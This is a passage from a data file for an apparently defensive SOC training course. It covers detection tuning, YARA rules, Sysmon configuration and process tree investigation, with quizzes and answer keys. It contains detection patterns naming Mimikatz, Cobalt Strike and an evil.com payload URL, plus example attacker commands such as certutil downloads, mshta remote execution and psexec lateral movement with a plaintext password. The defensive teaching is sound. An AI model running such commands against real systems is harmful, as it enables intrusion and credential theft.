        ]
      }
    ]
  },


  {
    id: 'week40',
    title: 'Detection Engineering & YARA Rules',
    durationText: 'Week 40 (Days 1-2)',
    focus: 'Build signature and behavioral detections, write YARA rules, and tune rules to minimize false positives',
    output: 'Production-quality YARA rules, signature vs behavioral detection strategies, and tuning methodology',
    topics: [
      {
        id: 'we40d01',
        title: 'Signature vs Behavioral Detection',
        description: 'Understand signature-based and behavioral detection, apply tuning strategies',
        type: 'learn',
        duration: '3 hours',
        content: `:::objectives
- Differentiate signature-based and behavioral detection
- Know when to use each approach
- Apply rule tuning strategies to reduce false positives
:::

### Signature-Based Detection

| Type | Tool | What It Matches |
|------|------|-----------------|
| Hash matching | FIM | Exact file hash |
| String matching | YARA, grep | Text/hex patterns |
| Rule-based | Snort/Suricata | Network packet patterns |
| Log pattern | SIEM rules | Specific field values |

**Pros:** Low FP rate, fast, easy to document. **Cons:** Cannot detect zero-day, requires updates, easily evaded.

### Behavioral Detection

| Type | Example | Source |
|------|---------|--------|
| Anomaly detection | Unusual process tree | EDR, Sysmon |
| Statistical baseline | 300% increase in auth failures | SIEM analytics |
| Sequence detection | Recon -> exploit -> persist -> C2 | SIEM correlation |

**Pros:** Detects zero-day, harder to evade. **Cons:** Higher FP rate, requires baselining.

### Rule Tuning Strategies

**1. Threshold Adjustment:**
\`\`\`xml
<rule id="100400" level="8">
  <if_sid>5716</if_sid>
  <frequency>5</frequency>
  <timeframe>300</timeframe>
  <description>Brute force: 5+ failures in 5 minutes</description>
</rule>
\`\`\`

**2. Whitelisting:**
\`\`\`xml
<rule id="100401" level="0">
  <if_sid>100400</if_sid>
  <field name="srcip">192.168.1.100</field>
  <description>Whitelist: monitoring server</description>
</rule>
\`\`\`

**3. Context-Based Suppression:**
Suppress alerts during maintenance windows.

**4. Field-Specific Narrowing:**
\`\`\`xml
<rule id="100403" level="10">
  <if_sid>4688</if_sid>
  <field name="CommandLine" type="pcre2">(?i)(mimikatz|sekurlsa)</field>
  <description>Mimikatz execution detected</description>
</rule>
\`\`\`

:::classwork
**Lab:** Review past week alerts, identify top 3 frequent types, apply tuning (threshold/whitelist/narrowing), document changes.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'When would you choose behavioral detection over signature-based?',
        interviewAnswer: 'Use behavioral when threats are novel, polymorphic, or easily evaded - like credential dumping. Attackers change tool names/hashes but the behavior (LSASS access) stays consistent.',
        quiz: [
          { question: 'Main advantage of signature-based detection?', options: ['Low false positive rate and fast matching', 'Detects zero-day attacks', 'No signature updates needed', 'Works without log sources'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Signature-based excels at matching known patterns with high accuracy.', certTags: ['Detection'] },
          { question: 'Main weakness of behavioral detection?', options: ['Higher false positive rate', 'Cannot detect zero-day', 'Requires exact hash matches', 'Only works on network traffic'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Behavioral detection identifies patterns that can trigger on legitimate unusual behavior.', certTags: ['Detection'] },
          { question: 'What is "threshold adjustment" in tuning?', options: ['Changing event count before alert fires', 'Adjusting severity levels', 'Modifying log source priority', 'Changing time range for grouping'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Threshold tuning changes how many events must occur before alerting.', certTags: ['Detection', 'Tuning'] },
          { question: 'When to use YARA vs Sigma rules?', options: ['YARA scans files; Sigma searches logs', 'They are interchangeable', 'Sigma for network, YARA for endpoint', 'YARA for Linux, Sigma for Windows'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'YARA scans file contents; Sigma searches log events. Different purposes.', certTags: ['Detection', 'YARA'] },
          { question: 'What is IP whitelisting used for?', options: ['Exclude known-good IPs to reduce false positives', 'Allow only whitelisted IPs to trigger', 'Block all non-whitelisted IPs', 'Speed up SIEM queries'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'IP whitelisting suppresses alerts from known-good sources.', certTags: ['Detection', 'Tuning'] },
          { question: 'What is "anomaly detection"?', options: ['Identifying activity deviating from statistical baseline', 'Matching known malware signatures', 'Scanning files for strings', 'Monitoring only network traffic'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Anomaly detection alerts when activity significantly deviates from established baseline.', certTags: ['Detection'] },
          { question: 'Why is context-based suppression better than disabling a rule?', options: ['Maintains detection for other contexts while suppressing specific scenarios', 'Disabling is faster', 'Context suppression uses less CPU', 'Disabled rules cannot be re-enabled'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Context suppression keeps the rule active for other scenarios while suppressing specific conditions.', certTags: ['Detection', 'Tuning'] },
          { question: 'What is "statistical baselining" in behavioral detection?', options: ['Establishing normal behavior patterns over time to detect anomalies', 'Counting total alert volume', 'Setting static thresholds for all users', 'Comparing to vendor benchmarks'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Baselining learns what "normal" looks like (login times, data volumes) then alerts on deviations.', certTags: ['Detection'] },
          { question: 'Which approach is better for detecting zero-day attacks?', options: ['Behavioral detection', 'Signature-based', 'Hash matching only', 'Manual log review'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Behavioral detection catches novel attacks by identifying suspicious patterns rather than known signatures.', certTags: ['Detection'] },
          { question: 'What is "process whitelisting" in detection tuning?', options: ['Excluding known-good processes from triggering alerts', 'Blocking all unknown processes', 'Only allowing whitelisted processes to run', 'Logging all process executions'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Process whitelisting suppresses alerts for legitimate admin tools that match malicious signatures.', certTags: ['Detection', 'Tuning'] },
          { question: 'Why do attackers prefer to evade behavioral detection over signature-based?', options: ['Behavioral detection is harder to evade because behavior must change', 'Behavioral detection has lower coverage', 'Behavioral detection is slower', 'Behavioral detection only works on Windows'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'To evade behavioral detection, attackers must fundamentally change their behavior, which limits their options.', certTags: ['Detection'] },
          { question: 'What is "sequence detection" in behavioral security?', options: ['Detecting attack patterns by identifying specific event sequences', 'Detecting events in chronological order', 'Counting events per sequence', 'Grouping events by sequence number'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Sequence detection identifies attack chains: specific events occurring in a defined order.', certTags: ['Detection'] },
          { question: 'What does "rule noise" mean in SOC operations?', options: ['Alerts that fire frequently but are almost always false positives', 'Alerts with loud notification sounds', 'Rules that consume excessive CPU', 'Rules that generate duplicate alerts'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Rule noise wastes analyst time on alerts that are almost never true positives.', certTags: ['Detection', 'SOC'] },
          { question: 'Which tuning strategy addresses alerts from vulnerability scanners?', options: ['IP whitelisting the scanner addresses', 'Disabling the alert rule', 'Increasing alert severity', 'Adding more log sources'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Vulnerability scanners generate predictable traffic that should be whitelisted.', certTags: ['Detection', 'Tuning'] },
          { question: 'What is the risk of over-tuning detection rules?', options: ['May suppress real true positives along with false positives', 'Increases alert volume', 'Slows down SIEM performance', 'Requires more storage'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Over-tuning can create detection gaps where real attacks slip through.', certTags: ['Detection', 'Tuning'] }
        ]
      },
      {
        id: 'we40d02',
        title: 'YARA Rules',
        description: 'Write YARA rules for malware detection, test them, and integrate into detection workflows',
        type: 'lab',
        duration: '4 hours',
        content: `:::objectives
- Understand YARA rule structure: rule name, meta, strings, condition
- Write rules using text, hex, and regex string types
- Apply conditions: any of, all of, filesize, entrypoint
- Test YARA rules against samples
:::

### YARA Rule Structure

\`\`\`yara
rule Malware_Detection_Example
{
    meta:
        description = "Detects specific malware pattern"
        author = "SOC Team"
        date = "2024/01/15"
        reference = "https://example.com/report"
        severity = "high"

    strings:
        $s1 = "malware_string" ascii wide nocase
        $s2 = "Another_Pattern" ascii
        $hex1 = { 4D 5A 90 00 03 00 00 00 }
        $regex1 = /powershell.*-enc [A-Za-z0-9+/=]{20,}/
        $url = /https?:\\/\\/evil\\.com\\/payload/

    condition:
        uint16(0) == 0x5A4D and
        filesize < 500KB and
        2 of ($s*) and
        $hex1 at 0
}
\`\`\`

### String Types

| Type | Syntax | Use Case |
|------|--------|----------|
| **Text** | "string" ascii wide | ASCII and Unicode text |
| **Hex** | { 4D 5A 90 00 } | Binary byte patterns |
| **Regex** | /pattern/i | Complex pattern matching |

**Text modifiers:**
- \`ascii\` - match ASCII encoding
- \`wide\` - match UTF-16 encoding
- \`nocase\` - case insensitive
- \`xor\` - XOR encoded strings

### Condition Operators

| Operator | Usage | Example |
|----------|-------|---------|
| \`any of ($s*)\` | Any matching string | \`any of ($s*)\` |
| \`all of ($s*)\` | All must match | \`all of ($s*)\` |
| \`filesize\` | File size check | \`filesize < 1MB\` |
| \`entrypoint\` | PE entry point | \`entrypoint > 0x1000\` |
| \`at\` | Byte position | \`$hex at 0\` |
| \`in\` | Range search | \`$s1 in (0..100)\` |
| \`matches\` | Regex count | \`#regex1 > 3\` |

### Example: Detecting Cobalt Strike Beacon

\`\`\`yara
rule CobaltStrike_Beacon
{
    meta:
        description = "Detects Cobalt Strike beacon configuration"
        author = "SOC Team"
        severity = "critical"

    strings:
        $beacon_config = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? }
        $malleable = "Malleable C2" ascii
        $pipe_name = "\\\\.\\pipe\\msagent_" ascii
        $sleep_mask = { 4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 }

    condition:
        uint16(0) == 0x5A4D and
        filesize < 500KB and
        ($beacon_config or $malleable or $pipe_name or $sleep_mask)
}
\`\`\`

### Example: Detecting Mimikatz

\`\`\`yara
rule Mimikatz_In_Memory
{
    meta:
        description = "Detects Mimikatz patterns in memory dumps"
        severity = "critical"

    strings:
        $mimikatz = "mimikatz" ascii wide nocase
        $sekurlsa = "sekurlsa" ascii wide nocase
        $kerberos = "kerberos::golden" ascii wide nocase
        $crypto = "CryptoKey" ascii wide
        $priv = "SeDebugPrivilege" ascii wide

    condition:
        3 of them
}
\`\`\`

### Testing YARA Rules

\`\`\`bash
# Install YARA
sudo apt install yara

# Test against a file
yara rule.yar target.exe

# Test against a directory
yara -r rule.yar /path/to/samples/

# Test with rules directory
yara -r /etc/yara/rules/ /path/to/samples/
\`\`\`

### YARA Rule Best Practices

1. **Always include file type check** - \`uint16(0) == 0x5A4D\` for PE files
2. **Use specific strings** - avoid generic patterns that match many files
3. **Set filesize limits** - prevents scanning huge files
4. **Include metadata** - description, author, date, severity
5. **Test thoroughly** - run against known good and known bad samples

:::classwork
**Lab:**
1. Write a YARA rule that detects a simulated malware sample with these strings:
   - Text: "C:\\Windows\\Temp\\backdoor.exe"
   - Hex: { 89 45 FC 8B 4D 08 }
   - Regex: /cmd\\.exe \\/c \\/del/
2. Include PE header check and filesize < 1MB
3. Test against the sample file
4. Verify it does NOT trigger on legitimate system files
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'Explain the difference between YARA and Sigma rules and when you would use each.',
        interviewAnswer: 'YARA scans file contents (executables, documents, scripts) for specific byte patterns, text strings, and regex. Use YARA for malware detection, file scanning, and threat hunting. Sigma searches log events (Sysmon, Windows Events) for suspicious activity patterns. Use Sigma for SIEM detection rules that alert on log-based indicators. YARA is file-focused; Sigma is log-focused.',
        quiz: [
          { question: 'What are the four main sections of a YARA rule?', options: ['rule name, meta, strings, condition', 'header, body, imports, modules', 'name, tags, patterns, actions', 'rule, match, alert, log'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'YARA rules have: name, meta (metadata), strings (patterns to match), and condition (when to trigger).', certTags: ['YARA'] },
          { question: 'What does `uint16(0) == 0x5A4D` check for in a YARA condition?', options: ['PE file header (MZ magic bytes)', 'File size', 'String encoding', 'Network protocol'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: '0x5A4D is the MZ header indicating a Windows PE executable.', certTags: ['YARA'] },
          { question: 'What modifier makes a YARA string match case-insensitive?', options: ['nocase', 'ascii', 'wide', 'xor'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'The nocase modifier makes string matching case-insensitive.', certTags: ['YARA'] },
          { question: 'Which condition operator matches "any one of the strings"?', options: ['any of ($s*)', 'all of ($s*)', '1 of them', 'both of them'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'any of ($s*) triggers if any string in the $s* wildcard matches.', certTags: ['YARA'] },
          { question: 'What does the `wide` modifier do?', options: ['Matches UTF-16 encoded strings', 'Matches ASCII strings', 'Matches wide file paths', 'Matches Unicode filenames'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'wide matches UTF-16 encoding, common in Windows APIs and some malware.', certTags: ['YARA'] },
          { question: 'How do you test a YARA rule against a file?', options: ['yara rule.yar target.exe', 'yara --test rule.yar', 'yara -scan rule.yar target.exe', 'yara --verify rule.yar target.exe'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'yara rule.yar target.exe runs the rule against the specified file.', certTags: ['YARA'] },
          { question: 'What is the `filesize` condition used for?', options: ['Limit scanning to files below a certain size', 'Check total disk usage', 'Measure memory consumption', 'Count number of files'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'filesize prevents scanning huge files and helps narrow detection to expected malware sizes.', certTags: ['YARA'] },
          { question: 'What does `at 0` mean in a YARA condition?', options: ['The string must be found at byte offset 0 (beginning of file)', 'Match only once', 'At least 0 matches', 'Check at timestamp 0'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'at 0 checks if the string appears at byte position 0 (the start of the file).', certTags: ['YARA'] },
          { question: 'Which hex pattern correctly matches the bytes { 4D 5A 90 00 }?', options: ['$hex = { 4D 5A 90 00 }', '$hex = "4D5A9000"', '$hex = 0x4D5A9000', '$hex = /4D5A9000/'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Hex strings in YARA use curly braces with space-separated hex bytes.', certTags: ['YARA'] },
          { question: 'What does `entrypoint` check for in a PE file?', options: ['The address where execution begins - useful for detecting packed/encrypted malware', 'File creation time', 'Import table location', 'Resource section offset'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'entrypoint is where code execution starts. Unusual entry points may indicate packing or encryption.', certTags: ['YARA'] },
          { question: 'What does `xor` modifier do in YARA strings?', options: ['Matches strings that are XOR-encoded with any single-byte key', 'XORs two strings together', 'Decrypts the file before matching', 'Only matches XOR-encrypted files'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'The xor modifier matches strings that have been XOR-encoded with any single-byte key (0-255).', certTags: ['YARA'] },
          { question: 'How do you recursively scan a directory with YARA?', options: ['yara -r rule.yar /path/to/dir/', 'yara --recursive rule.yar /path/', 'yara -R rule.yar /path/', 'yara --dir rule.yar /path/'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'The -r flag enables recursive scanning of subdirectories.', certTags: ['YARA'] },
          { question: 'Why should you always include file type checks in YARA rules?', options: ['Prevents false positives from scanning wrong file types', 'Improves scan speed', 'Required by YARA syntax', 'Enables multi-platform support'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Without file type checks, a PE-specific rule might trigger on documents or images containing similar byte patterns.', certTags: ['YARA'] },
          { question: 'What is the `#regex1 > 3` condition checking?', options: ['The regex matches more than 3 times in the file', 'The regex is rule number 3', 'At least 3 rules match', 'The regex is found in 3+ files'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'The # prefix counts the number of matches. #regex1 > 3 means the regex matched more than 3 times.', certTags: ['YARA'] },
          { question: 'What is the difference between `any of ($s*)` and `all of ($s*)`?', options: ['any = trigger if any string matches; all = all must match', 'any = faster; all = slower', 'any = for text; all = for hex', 'No difference'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'any of triggers on one match; all of requires every string to match.', certTags: ['YARA'] }
        ]
      }
    ]
  },


  {
    id: 'week41',
    title: 'Endpoint Security & Sysmon',
    durationText: 'Week 41 (Days 1-2)',
    focus: 'Deep dive into Sysmon event logging, process tree analysis, and endpoint investigation techniques',
    output: 'Ability to configure Sysmon, analyze process trees, and investigate suspicious endpoint activity',
    topics: [
      {
        id: 'we41d01',
        title: 'Sysmon Deep Dive',
        description: 'Install and configure Sysmon, understand key Event IDs, and detect malicious behavior',
        type: 'learn',
        duration: '4 hours',
        content: `:::objectives
- Install and configure Sysmon on Windows
- Understand key Sysmon Event IDs and their fields
- Configure XML filters for targeted monitoring
- Detect malicious behavior through Sysmon events
:::

### Sysmon Installation

\`\`\`bash
# Download Sysmon from Microsoft Sysinternals
sysmon.exe -i config.xml
\`\`\`

### Key Sysmon Event IDs

| Event ID | Name | What It Captures |
|----------|------|-----------------|
| **1** | Process Creation | New process with command line, hashes |
| **3** | Network Connection | Outbound/inbound connections |
| **7** | Image Loaded | DLLs loaded by processes |
| **8** | CreateRemoteThread | Process injection indicator |
| **10** | Process Access | One process accessing another |
| **11** | File Created | New file on disk |
| **13** | Registry Value Set | Registry modifications |
| **15** | File Create Stream Hash | ADS (Alternate Data Streams) |

### Sysmon XML Configuration

\`\`\`xml
<Sysmon schemaversion="4.90">
  <HashAlgorithms>md5,sha256,IMPHASH</HashAlgorithms>
  <CheckRevocation/>
  <EventFiltering>
    <ProcessCreate onmatch="exclude">
      <ParentImage condition="is">C:\\Windows\\explorer.exe</ParentImage>
    </ProcessCreate>

    <NetworkConnection onmatch="include">
      <DestinationPort condition="is">443</DestinationPort>
      <DestinationPort condition="is">8443</DestinationPort>
    </NetworkConnection>

    <FileCreate onmatch="include">
      <TargetFilename condition="contains">\\Temp\\</TargetFilename>
      <TargetFilename condition="endswith">.exe</TargetFilename>
      <TargetFilename condition="endswith">.dll</TargetFilename>
    </FileCreate>

    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">\\CurrentVersion\\Run</TargetObject>
      <TargetObject condition="contains">\\CurrentVersion\\RunOnce</TargetObject>
    </RegistryEvent>

    <ProcessAccess onmatch="include">
      <GrantedAccess condition="is">0x1010</GrantedAccess>
      <GrantedAccess condition="is">0x1410</GrantedAccess>
    </ProcessAccess>
  </EventFiltering>
</Sysmon>
\`\`\`

:::warning
Event 10 with GrantedAccess 0x1010 or 0x1410 indicates LSASS access - credential dumping indicator.
:::

### Detecting Malicious Behavior

**Process Injection (Event 8 - CreateRemoteThread):**
\`\`\`
Process: svchost.exe
Target Process: explorer.exe
Start Address: 0x7FF... (not a known DLL)
\`\`\`

**Suspicious Registry Persistence (Event 13):**
\`\`\`
TargetObject: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateService
Details: C:\\Windows\\Temp\\update.exe
\`\`\`

:::classwork
**Lab:** Install Sysmon with a custom config that monitors: process creation, file creation in Temp, registry Run keys, and LSASS access events. Generate test events and verify in Event Viewer.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'Which Sysmon events would you monitor to detect credential dumping?',
        interviewAnswer: 'Event 10 (Process Access) with GrantedAccess 0x1010/0x1410 for LSASS access, Event 1 for the dumping tool execution, Event 11 for any credential files dropped, and Event 3 for outbound network connections during exfiltration.',
        quiz: [
          { question: 'Which Sysmon Event ID captures new process creation?', options: ['Event 1', 'Event 3', 'Event 7', 'Event 11'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Event 1 records process creation with command line and hashes.', certTags: ['Sysmon'] },
          { question: 'What does Sysmon Event 8 (CreateRemoteThread) indicate?', options: ['Process injection - one process creating a thread in another', 'New file creation', 'Registry modification', 'Network connection'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'CreateRemoteThread is a classic process injection indicator.', certTags: ['Sysmon'] },
          { question: 'Which Sysmon Event ID captures file creation?', options: ['Event 11', 'Event 1', 'Event 13', 'Event 7'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Event 11 records new files created on disk.', certTags: ['Sysmon'] },
          { question: 'What does Event 13 (Registry Value Set) detect?', options: ['Registry modifications - check for persistence', 'New processes', 'Network connections', 'DLL loads'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Event 13 captures registry modifications, common for persistence.', certTags: ['Sysmon'] },
          { question: 'Which GrantedAccess value in Event 10 indicates LSASS access?', options: ['0x1010 or 0x1410', '0x0000', '0xFFFF', '0x1234'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: '0x1010 and 0x1410 are access rights that allow reading process memory (LSASS).', certTags: ['Sysmon', 'Credential Access'] },
          { question: 'What does Sysmon Event 15 (File Create Stream Hash) detect?', options: ['Alternate Data Streams - hiding data in NTFS streams', 'File deletion', 'File permissions change', 'File encryption'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Event 15 detects ADS usage, which malware uses to hide data.', certTags: ['Sysmon'] },
          { question: 'How do you install Sysmon with a custom config?', options: ['sysmon.exe -i config.xml', 'sysmon --install config.xml', 'sysmon config.xml', 'sysmon -c config.xml'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'sysmon.exe -i config.xml installs with the specified configuration.', certTags: ['Sysmon'] },
          { question: 'What does Event 7 (Image Loaded) help detect?', options: ['DLL hijacking, side-loading, and malicious library loads', 'Process creation', 'Registry changes', 'Network connections'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Event 7 tracks which DLLs processes load, detecting DLL hijacking and malicious libraries.', certTags: ['Sysmon'] },
          { question: 'What does the `onmatch="include"` attribute mean in Sysmon config?', options: ['Only capture events matching the specified filters', 'Exclude matching events', 'Include all events', 'Log only errors'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'include means only capture events that match the filter conditions.', certTags: ['Sysmon'] },
          { question: 'What does IMPHASH in Sysmon HashAlgorithms compute?', options: ['Import hash - useful for identifying malware families by import table', 'Image hash', 'Import path hash', 'Implementation hash'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'IMPHASH hashes the PE import table, helping identify malware families.', certTags: ['Sysmon'] },
          { question: 'Which Sysmon event combination indicates credential dumping via Mimikatz?', options: ['Event 10 (LSASS access) + Event 1 (tool execution) + Event 3 (C2 connection)', 'Only Event 1', 'Event 11 + Event 13', 'Event 7 + Event 8'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Credential dumping shows as LSASS access (Event 10), tool execution (Event 1), and potential C2 (Event 3).', certTags: ['Sysmon', 'Credential Access'] },
          { question: 'What is the purpose of `<HashAlgorithms>` in Sysmon config?', options: ['Specify which hash algorithms to compute for process images', 'Hash the config file', 'Encrypt Sysmon logs', 'Verify file integrity'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'HashAlgorithms specifies MD5, SHA256, and/or IMPHASH for process images.', certTags: ['Sysmon'] },
          { question: 'What does `CheckRevocation` in Sysmon config do?', options: ['Checks digital certificate revocation status of signed drivers', 'Verifies Sysmon license', 'Checks Windows Update status', 'Validates hash signatures'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'CheckRevocation verifies that signed drivers have not been revoked.', certTags: ['Sysmon'] },
          { question: 'Why monitor registry Run keys (Event 13)?', options: ['Common persistence mechanism - malware auto-starts with Windows', 'Performance monitoring', 'User preference tracking', 'License compliance'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Run keys are one of the most common persistence locations for malware.', certTags: ['Sysmon'] },
          { question: 'What is the difference between `onmatch="include"` and `onmatch="exclude"`?', options: ['Include = only match specified filters; Exclude = capture all except specified', 'Include = faster; Exclude = slower', 'Include = for events; Exclude = for logs', 'No difference'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'include captures only matching events; exclude captures all except matching events.', certTags: ['Sysmon'] }
        ]
      },
      {
        id: 'we41d02',
        title: 'Process Trees & Endpoint Investigation',
        description: 'Analyze parent-child process relationships, suspicious command lines, and investigation tools',
        type: 'practice',
        duration: '4 hours',
        content: `:::objectives
- Analyze parent-child process relationships
- Identify suspicious command-line patterns
- Use ProcMon and Process Explorer for investigation
- Investigate a suspicious process tree
:::

### Suspicious Command-Line Patterns

| Pattern | Risk | Investigation |
|---------|------|---------------|
| \`powershell.exe -enc\` | Encoded commands — malware | Decode base64 payload |
| \`cmd.exe /c certutil\` | File download via certutil | Check downloaded file hash |
| \`mshta.exe http://\` | Remote script execution | Block URL, check for persistence |
| \`wmic process call create\` | WMI lateral movement | Check creator process |
| \`rundll32.exe javascript:\` | Script execution via rundll32 | Check DLL loaded |
| \`bitsadmin /transfer\` | File download via BITS | Check destination path |

### Normal vs Suspicious Process Trees

**Normal:**
\`\`\`
wininit.exe
  +-- services.exe
  |     +-- svchost.exe (multiple instances)
  |     +-- spoolsv.exe
  +-- lsass.exe
\`\`\`

**Suspicious (Web Shell):**
\`\`\`
w3wp.exe (IIS)
  +-- cmd.exe
  |     +-- whoami
  |     +-- net group "Domain Admins"
  +-- powershell.exe -enc ...
  +-- certutil.exe -urlcache -split -f http://...
\`\`\`

**Suspicious (Lateral Movement):**
\`\`\`
svchost.exe
  +-- cmd.exe
  |     +-- net use \\\\DC01\\C$ /user:admin password
  |     +-- copy malware.exe \\\\DC01\\C$\\temp\\
  +-- psexec.exe -accepteula -s \\\\DC01 cmd.exe
\`\`\`

### Investigation Tools

**Process Monitor (ProcMon):**
- Real-time file system, registry, and process activity
- Filter by process name, path, operation
- Look for: file writes to unusual locations, registry modifications, network activity

**Process Explorer:**
- Shows process tree, handles, DLLs, services
- Highlight suspicious processes (red = unsigned, pink = packed)
- Check process properties for command line, company name

### Investigation Checklist

1. Identify the suspicious process and its parent
2. Check the command line for encoded/obfuscated arguments
3. Verify the process path (system32 vs temp vs user profile)
4. Check digital signature (signed by Microsoft vs unknown)
5. Look for child processes (what did it spawn?)
6. Check network connections (Event 3)
7. Check file drops (Event 11)
8. Check registry modifications (Event 13)

:::classwork
**Lab:** You receive a Sysmon alert: w3wp.exe spawned cmd.exe, which ran powershell.exe with encoded command. Investigate: decode the command, identify IOCs, check for persistence, document findings.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'What makes a process tree suspicious in endpoint investigation?',
        interviewAnswer: 'Suspicious indicators: unexpected parent-child relationships (IIS worker spawning cmd.exe), encoded PowerShell commands, processes running from temp directories, unsigned executables, processes accessing LSASS, and commands that typically indicate recon (whoami, net group, ipconfig).',
        quiz: [
          { question: 'What does `powershell.exe -enc` typically indicate?', options: ['Encoded command - likely malicious payload', 'Help documentation', 'Configuration file', 'Normal PowerShell startup'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: '-enc hides the actual command, commonly used by malware.', certTags: ['Endpoint', 'PowerShell'] },
          { question: 'Why is w3wp.exe -> cmd.exe suspicious?', options: ['IIS worker should never spawn cmd.exe - indicates web shell', 'Normal IIS maintenance', 'Expected during deployment', 'Configuration backup'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'IIS worker processes do not normally spawn command shells.', certTags: ['Endpoint', 'Web Security'] },
          { question: 'What does `certutil -urlcache -split -f http://` do?', options: ['Downloads a file from a URL via certutil', 'Checks certificate validity', 'Caches DNS queries', 'Splits log files'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'certutil is commonly abused to download malware payloads.', certTags: ['Endpoint', 'Defense Evasion'] },
          { question: 'What does `wmic process call create` indicate?', options: ['WMI lateral movement - spawning process on remote host', 'Normal WMI query', 'Service installation', 'Registry modification'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'WMI process creation is a common lateral movement technique.', certTags: ['Endpoint', 'Lateral Movement'] },
          { question: 'What should you check first when investigating a suspicious process?', options: ['Parent process and command line arguments', 'Network connections', 'Registry modifications', 'DLL loads'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Start with the parent process relationship and command line to understand context.', certTags: ['Endpoint'] },
          { question: 'In Process Explorer, what does a red-highlighted process indicate?', options: ['Unsigned code - potentially malicious', 'High CPU usage', 'System process', 'Network activity'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Process Explorer highlights unsigned processes in red.', certTags: ['Endpoint'] },
          { question: 'What is a suspicious sign in a process tree?', options: ['Unexpected parent-child relationships', 'Multiple svchost.exe instances', 'Explorer.exe as parent', 'Services.exe starting services'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Unusual parent-child relationships indicate process injection or exploitation.', certTags: ['Endpoint'] },
          { question: 'How do you decode a base64 PowerShell command?', options: ['[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("encoded"))', 'Decode it manually', 'Use cmd.exe /d', 'It cannot be decoded'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'PowerShell base64 encoding uses Unicode; decode with .NET encoding classes.', certTags: ['Endpoint', 'PowerShell'] },
          { question: 'What does a process running from C:\\Windows\\Temp\\ typically indicate?', options: ['Potential malware - legitimate processes rarely run from Temp', 'Normal system process', 'Windows Update', 'Scheduled task'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Legitimate Windows processes run from System32; Temp is a common malware staging location.', certTags: ['Endpoint'] },
          { question: 'What does `rundll32.exe javascript:` execute?', options: ['JavaScript code via rundll32 - script execution technique', 'A JavaScript DLL', 'Windows script host', 'Internet Explorer scripting'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'rundll32 can execute JavaScript directly, bypassing script host controls.', certTags: ['Endpoint', 'Defense Evasion'] },
          { question: 'What is the purpose of checking a process digital signature?', options: ['Verify authenticity - unsigned processes are higher risk', 'Check file size', 'Measure execution speed', 'Verify file permissions'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Digital signatures verify the publisher. Unsigned code is suspicious.', certTags: ['Endpoint'] },
          { question: 'Which tool shows real-time file system and registry activity?', options: ['Process Monitor (ProcMon)', 'Process Explorer', 'Wireshark', 'Volatility'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'ProcMon shows real-time file, registry, and process activity.', certTags: ['Endpoint'] },
